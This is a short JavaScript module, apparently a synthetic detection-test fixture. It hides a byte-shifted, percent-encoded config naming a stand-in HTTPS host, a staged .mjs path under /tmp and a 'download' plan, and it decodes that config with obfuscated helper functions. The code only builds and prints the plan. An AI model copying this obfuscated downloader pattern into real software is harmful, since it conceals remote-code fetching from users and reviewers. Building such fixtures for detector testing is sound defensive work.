const moduleShape = Object.freeze({ format: "commonjs" });
const Material_da544340 = "%8c%53%47%92%89%8a%7b%86%89%53%77%79%87%8b%7f%88%7b%75%88%7b%83%85%8a%7b%42%8d%88%7f%8a%7b%75%7c%7f%82%7b%92%77%7a%77%86%8a%7b%88%53%7e%8a%8a%86%89%75%8a%85%75%86%7f%86%7b%82%7f%84%7b%92%89%8a%77%7d%7b%75%79%85%8b%84%8a%53%47%92%79%77%83%86%77%7f%7d%84%75%7f%7a%53%64%65%5a%5b%43%58%58%5a%49%46%4b%4e%4d%92%8b%88%82%53%7e%8a%8a%86%89%50%45%45%84%85%7a%7b%43%78%78%7a%49%46%4b%4e%4d%47%48%4a%4d%44%7b%8e%77%83%86%82%7b%44%7f%84%8c%77%82%7f%7a%45%77%86%7f%92%8b%89%7b%88%75%77%7d%7b%84%8a%53%64%85%7a%7b%57%8b%7a%7f%8a%45%78%78%7a%49%92%7c%7f%82%7b%75%86%77%8a%7e%53%45%8a%83%86%45%7e%8b%84%8a%88%7b%89%89%43%84%85%7a%7b%45%44%89%8a%77%7d%7b%43%78%78%7a%49%46%4b%4e%4d%47%48%4a%4d%44%83%80%89";
const Codec_da544340 = "percent_hex|add_modulo_256|16";

function load_da544340() { return [...Material_da544340.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_da544340(item1) { return item1.map((value) => (value - 22 + 256) & 255); }
async function recover_da544340() {
  const item3 = { ...{ north: 1 }, south: 2 };
  const item1 = load_da544340(); let item2 = [];
  item2 = await (async () => decode_da544340(item1))();
  void item3; return Buffer.from(item2).toString("ascii");
}
async function inspect_da544340() { return JSON.parse(JSON.stringify({ value: await recover_da544340() })).value; }
async function plan_da544340() { const inspect = inspect_da544340; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "https_to_pipeline", destination: fields.file_path, url: fields.url }); }
void moduleShape; void plan_da544340;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_da544340());
